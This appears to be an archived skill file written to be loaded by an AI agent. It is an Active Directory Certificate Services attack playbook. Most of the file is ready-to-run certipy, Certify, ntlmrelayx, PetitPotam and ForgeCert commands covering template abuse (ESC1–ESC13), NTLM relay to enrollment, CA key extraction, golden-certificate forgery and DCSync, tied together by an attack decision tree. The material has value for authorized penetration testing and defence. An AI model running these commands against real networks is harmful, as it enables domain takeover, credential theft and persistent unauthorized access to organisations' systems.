<!-- archived from /root/.hermes/skills/security/active-directory-certificate-services/SKILL.md on 2026-10-21 -->

---
name: active-directory-certificate-services
description: >-
  AD Certificate Services attack playbook. Use when targeting misconfigured AD CS for privilege escalation via ESC1-ESC13 template abuse, NTLM relay to enrollment, CA officer abuse, and certificate-based persistence.
---

> 归档卡：原目录 `/root/.hermes/skills/security/active-directory-certificate-services`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/active-directory-certificate-services/…')`，不要相对 `references/legacy/` 解析。

# SKILL: AD CS Attack Playbook — Expert Guide

> **AI LOAD INSTRUCTION**: Expert AD CS (Active Directory Certificate Services) attack techniques. Covers ESC1 through ESC13, certificate-based persistence, NTLM relay to enrollment endpoints, and CA misconfigurations. Base models miss enrollment prerequisite chains and ESC condition combinations.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for ACL-based attacks that enable ESC4 (template modification)
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) for Kerberos techniques after obtaining certificates
- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) for ESC8 (relay to HTTP enrollment endpoint)
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) for using obtained certificates for lateral movement

### Advanced Reference

Also load [ADCS_ESC_MATRIX.md](./ADCS_ESC_MATRIX.md) when you need:
- ESC1–ESC13 quick reference table with conditions, impact, and tool commands
- One-liner exploitation commands per ESC variant
- Detection indicators per technique

---

## 1. AD CS ARCHITECTURE OVERVIEW

```
Certificate Authority (CA)
│
├── Enterprise CA (AD-integrated, issues certs based on templates)
│   ├── Certificate Templates (define who can enroll, what EKUs, subject settings)
│   ├── Enrollment endpoints: HTTP (certsrv), RPC, DCOM
│   └── Published in AD: CN=Public Key Services,CN=Services,CN=Configuration
│
├── Template Key Settings:
│   ├── Subject Alternative Name (SAN): who the cert represents
│   ├── Extended Key Usage (EKU): what the cert allows
│   ├── Enrollment permissions: who can request
│   └── Issuance requirements: manager approval, authorized signatures
│
└── Certificate → Kerberos Auth Flow:
    User presents cert → PKINIT → KDC verifies → issues TGT
```

---

## 2. ENUMERATION

```bash
# Certipy (recommended — comprehensive)
certipy find -u <EMAIL-REDACTED> -p password -dc-ip DC_IP -stdout
certipy find -u <EMAIL-REDACTED> -p password -dc-ip DC_IP -vulnerable -stdout

# Certify (from Windows)
Certify.exe find
Certify.exe find /vulnerable
Certify.exe cas                    # Enumerate CAs

# Manual LDAP query for templates
ldapsearch -H ldap://DC_IP -D "<EMAIL-REDACTED>" -w password \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com" \
  "(objectClass=pKICertificateTemplate)" cn msPKI-Certificate-Name-Flag pKIExtendedKeyUsage
```

---

## 3. ESC1 — ENROLLEE SUPPLIES SUBJECT

**Condition**: Template allows enrollee to specify Subject Alternative Name (SAN) + client authentication EKU + low-privilege enrollment.

```bash
# Certipy
certipy req -u <EMAIL-REDACTED> -p password -ca CA-NAME -target CA_HOST \
  -template VulnTemplate -upn <EMAIL-REDACTED>

# Certify (Windows)
Certify.exe request /ca:CA-NAME /template:VulnTemplate /altname:administrator

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# → NT hash of administrator
```

---

## 4. ESC2 — ANY PURPOSE EKU

**Condition**: Template has "Any Purpose" EKU or no EKU (subordinate CA cert) + low-privilege enrollment.

```bash
# Same as ESC1 exploitation
certipy req -u <EMAIL-REDACTED> -p password -ca CA-NAME -target CA_HOST \
  -template AnyPurposeTemplate -upn <EMAIL-REDACTED>
```

---

## 5. ESC3 — ENROLLMENT AGENT

**Condition**: Template allows enrollment agent certificate + another template allows enrollment on behalf of others.

```bash
# Step 1: Request enrollment agent cert
certipy req -u <EMAIL-REDACTED> -p password -ca CA-NAME -target CA_HOST \
  -template EnrollmentAgent

# Step 2: Use enrollment agent cert to request on behalf of admin
certipy req -u <EMAIL-REDACTED> -p password -ca CA-NAME -target CA_HOST \
  -template UserTemplate -on-behalf-of 'DOMAIN\administrator' -pfx enrollmentagent.pfx

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

## 6. ESC4 — TEMPLATE ACL MISCONFIGURATION

**Condition**: Low-privilege user has write access to certificate template object.

```bash
# Modify template to become ESC1 vulnerable
# Using Certipy:
certipy template -u <EMAIL-REDACTED> -p password -template VulnTemplate \
  -save-old -dc-ip DC_IP

# Template is now ESC1 → exploit as ESC1
certipy req -u <EMAIL-REDACTED> -p password -ca CA-NAME -target CA_HOST \
  -template VulnTemplate -upn <EMAIL-REDACTED>

# Restore original template (cleanup)
certipy template -u <EMAIL-REDACTED> -p password -template VulnTemplate \
  -configuration old_config.json -dc-ip DC_IP
```

---

## 7. ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

**Condition**: CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled → any template becomes ESC1.

```bash
# Check if flag is set
certutil -config "CA_HOST\CA-NAME" -getreg policy\EditFlags

# Exploit: request any template with SAN
certipy req -u <EMAIL-REDACTED> -p password -ca CA-NAME -target CA_HOST \
  -template User -upn <EMAIL-REDACTED>
```

---

## 8. ESC7 — CA OFFICER / MANAGER PERMISSIONS

**Condition**: User has ManageCA or ManageCertificates permission on the CA.

```bash
# With ManageCA: enable SubCA template (always allows SAN)
certipy ca -u <EMAIL-REDACTED> -p password -ca CA-NAME -dc-ip DC_IP \
  -enable-template SubCA

# Request SubCA cert with admin SAN (will be denied — "pending")
certipy req -u <EMAIL-REDACTED> -p password -ca CA-NAME -target CA_HOST \
  -template SubCA -upn <EMAIL-REDACTED>

# With ManageCertificates: approve the pending request
certipy ca -u <EMAIL-REDACTED> -p password -ca CA-NAME -dc-ip DC_IP \
  -issue-request REQUEST_ID

# Retrieve the issued certificate
certipy req -u <EMAIL-REDACTED> -p password -ca CA-NAME -target CA_HOST \
  -retrieve REQUEST_ID
```

---

## 9. ESC8 — NTLM RELAY TO HTTP ENROLLMENT

**Condition**: CA has HTTP enrollment endpoint (certsrv) without HTTPS enforcement.

```bash
# Setup relay to enrollment endpoint
ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC authentication (PetitPotam, PrinterBug, etc.)
PetitPotam.py RELAY_HOST DC01.domain.com

# DC authenticates → relay → certificate issued for DC01$
# Authenticate with certificate
certipy auth -pfx dc01.pfx -dc-ip DC_IP
# → DC01$ hash → DCSync
```

---

## 10. ESC9-ESC13 — NEWER DISCOVERIES

### ESC9: No Security Extension (StrongCertificateBindingEnforcement = 0/1)

Weak certificate mapping allows impersonation when `CT_FLAG_NO_SECURITY_EXTENSION` is set.

```bash
# Change victim's UPN to admin, request cert, change back
certipy shadow auto -u <EMAIL-REDACTED> -p pass -account victim -dc-ip DC_IP
```

### ESC10: Weak Certificate Mapping (Registry-based)

Similar to ESC9 but exploits `CertificateMappingMethods` registry value on DC.

### ESC11: NTLM Relay to RPC Enrollment

Relay NTLM to the CA's RPC interface (IF_ENFORCEENCRYPTICERTREQUEST not set).

```bash
ntlmrelayx.py -t "rpc://CA_HOST" -rpc-mode ICPR -icpr-ca-name "CA-NAME" \
  -smb2support --adcs --template DomainController
```

### ESC13: OID Group Link (Issuance Policy)

Template's issuance policy OID is linked to a group → certificate grants that group membership.

```bash
certipy req -u <EMAIL-REDACTED> -p pass -ca CA-NAME -target CA_HOST \
  -template ESC13Template
# Certificate grants membership in linked group
```

---

## 11. CERTIFICATE-BASED PERSISTENCE

### Golden Certificate

With CA private key → forge any certificate.

```bash
# Extract CA private key (requires admin on CA server)
certipy ca -backup -u <EMAIL-REDACTED> -p password -ca CA-NAME -target CA_HOST

# Forge certificate for any user
certipy forge -ca-pfx ca.pfx -upn <EMAIL-REDACTED> -subject "CN=Administrator,CN=Users,DC=domain,DC=com"

# Authenticate with forged cert
certipy auth -pfx forged.pfx -dc-ip DC_IP
```

**Persistence**: Valid until CA certificate expires or CA private key is rotated.

### ForgeCert (Windows)

```cmd
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "pass" --Subject "CN=User" \
  --SubjectAltName "<EMAIL-REDACTED>" --NewCertPath forged.pfx --NewCertPassword "pass"
```

---

## 12. AD CS ATTACK DECISION TREE

```
Targeting AD CS
│
├── Enumerate: certipy find -vulnerable
│
├── Vulnerable template found?
│   ├── Enrollee can set SAN + Client Auth EKU?
│   │   └── ESC1 → request cert with admin UPN (§3)
│   ├── Any Purpose EKU?
│   │   └── ESC2 → same as ESC1 (§4)
│   ├── Enrollment Agent template available?
│   │   └── ESC3 → enroll as agent, then on-behalf-of (§5)
│   └── OID group link in issuance policy?
│       └── ESC13 → request cert for group membership (§10)
│
├── Write access to template?
│   └── ESC4 → modify template to ESC1 condition (§6)
│
├── CA misconfiguration?
│   ├── EDITF_ATTRIBUTESUBJECTALTNAME2 flag?
│   │   └── ESC6 → any template becomes ESC1 (§7)
│   ├── ManageCA / ManageCertificates permission?
│   │   └── ESC7 → enable SubCA template, approve requests (§8)
│   └── HTTP enrollment without HTTPS?
│       └── ESC8 → NTLM relay to certsrv (§9)
│
├── Weak certificate mapping on DC?
│   ├── StrongCertificateBindingEnforcement < 2?
│   │   └── ESC9 → UPN manipulation + cert request (§10)
│   └── CertificateMappingMethods misconfigured?
│       └── ESC10 → similar UPN abuse (§10)
│
├── RPC enrollment without encryption?
│   └── ESC11 → NTLM relay to RPC (§10)
│
└── Already CA admin?
    └── Golden certificate for persistence (§11)
```
